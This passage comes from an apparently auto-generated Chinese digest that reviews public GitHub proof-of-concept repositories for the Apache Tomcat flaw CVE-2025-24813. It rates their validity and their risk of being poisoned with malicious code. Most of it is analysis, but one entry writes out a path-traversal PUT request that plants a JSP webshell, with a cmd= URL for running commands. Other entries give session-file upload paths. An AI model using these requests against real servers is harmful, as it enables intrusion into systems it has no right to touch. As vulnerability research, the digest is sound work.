攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

